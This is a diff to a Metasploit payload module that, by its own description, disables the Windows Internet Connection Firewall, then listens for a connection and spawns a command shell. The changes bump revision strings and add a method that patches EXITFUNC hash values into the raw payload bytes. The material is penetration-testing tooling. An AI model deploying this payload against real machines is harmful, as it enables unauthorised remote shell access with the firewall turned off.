@@ -1,5 +1,5 @@
 ##
-# $Id: shell_bind_tcp_xpfw.rb 6479 2009-04-13 14:33:26Z kris $
+# $Id: shell_bind_tcp_xpfw.rb 6925 2009-07-31 18:02:14Z hdm $
 ##
 
 ##
@@ -22,7 +22,7 @@ module Metasploit3
 	def initialize(info = {})
 		super(merge_info(info,
 			'Name'          => 'Windows Disable Windows ICF, Command Shell, Bind TCP Inline',
-			'Version'       => '$Revision: 6479 $',
+			'Version'       => '$Revision: 6925 $',
 			'Description'   => 'Disable the Windows ICF, then listen for a connection and spawn a command shell',
 			'Author'        => 'Lin0xx <lin0xx [at] metasploit.com>',
 			'License'       => MSF_LICENSE,
@@ -77,5 +77,18 @@ module Metasploit3
 				}
 			))
 	end
-
+	
+	# for now we must let this payload use the old EXITFUNC hash values.
+	def replace_var(raw, name, offset, pack)
+		super
+		if( name == 'EXITFUNC' )
+			datastore[name] = 'thread' if not datastore[name]
+			raw[offset, 4] = [ 0x5F048AF0 ].pack(pack || 'V') if datastore[name] == 'seh' 
+			raw[offset, 4] = [ 0x60E0CEEF ].pack(pack || 'V') if datastore[name] == 'thread'
+			raw[offset, 4] = [ 0x73E2D87E ].pack(pack || 'V') if datastore[name] == 'process'
+			return true
+		end
+		return false
+	end
+	
 end
